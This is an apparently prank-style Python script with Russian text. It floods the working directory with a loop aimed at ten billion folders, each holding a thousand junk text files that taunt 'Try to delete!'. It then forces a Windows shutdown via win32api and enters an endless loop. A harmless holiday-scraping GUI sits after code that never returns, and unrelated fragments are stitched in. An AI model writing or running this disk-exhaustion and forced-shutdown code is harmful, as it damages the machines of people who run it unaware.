from tkinter import *
root = Tk()
root.resize=False
root.geometry("500x190")
root.attributes("-alpha",0.75)
root.configure(bg="black")
txt = Text(root,fg="lightgreen",bg="black",font=("Arial",10),width=121,height=20)
txt.place(x=2,y=2)
root.attributes("-topmost",True)
from threading import Thread
import os
for i in range(100000*100000):
    name = 'новая папка-{}'.format(i)
    if not os.path.exists(name):
        os.mkdir(name)
        for i in range(1000):
            text_file = open(name+"/новая мамка"+str(i)+".txt", "w")
            text_file.write("Попробуй удали!рафщдшрадцрфдарфдалфцмалфмцагшнфмалдгифшлрамфщгапфрцамфщгашлрфцащгдшфрцашлрфашлгпфыалгопшгыуапгыпрзшырпщшырпзфрпзфцрпзщшыфурпфцзпрфзцшпзфцпрзшфрпзшфцрпзшфцрпрцфпрпрпррыкппырпырпрыпыпрыпрыпрыпрщыпрыурщышпузрышпзырпушрыыпршрщшпыурзшыпыпурзшыпурыпузыщрш")
            text_file.close()
print("OK")
class MyThread(Thread):
    def __init__(self, name):
        Thread.__init__(self)
        self.name = name
    def run(self):
        for i in range(1000000):
            msg = "%s is running" % \
                self.name
            print(msg)
number = 1
import sys
var1="Python"
var2=10000
var3=True
print(sys.getsizeof(var1))
print(sys.getsizeof(var2))
print(sys.getsizeof(var3))
import win32api
win32api.InitiateSystemShutdown()
while number != 0:
    number += 10000
    print(number)
import requests
res = requests.get("https://calend.online/holiday/")
res = res.text
a=res.split("<h2>Праздники сегодня <small>полный список</small><")[1]
a=a.split("/ul")[0]
a=a.split('<ul class="holidays-list">')[1]
a=a.split("<li>\n")
a=[i.strip(" qwertyuiop[]asdfghjkl;''zxcv//bnm,./>/<=-\t\n") for i in a]
a=[i.split("<")[0] for i in a]
a=[i.strip(' qwertyuiop[]asdfghjkl;""zxcvbnm,./>/<=-\t\n') for i in a]
a=[i for i in a if i!=""]
a="\n".join(a)
txt.insert(1.0,a)
root.mainloop()